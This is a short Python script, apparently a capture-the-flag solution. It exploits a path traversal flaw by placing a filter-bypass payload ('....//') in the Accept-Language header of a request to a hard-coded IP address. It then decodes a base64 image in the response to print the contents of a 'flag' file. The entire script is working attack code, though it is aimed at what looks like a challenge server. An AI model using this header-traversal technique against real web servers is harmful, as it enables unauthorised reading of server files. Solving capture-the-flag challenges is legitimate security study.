import requests
import base64
import re

url = "http://35.207.169.47/"

session = requests.Session()

session.headers.update({'Accept-Language': "....//....//....//....//flag"})

response = session.get(url)

m = re.findall(r'<\s*img[^>]*>', response.text)
print(base64.b64decode(m[0].split(',')[1]).strip())
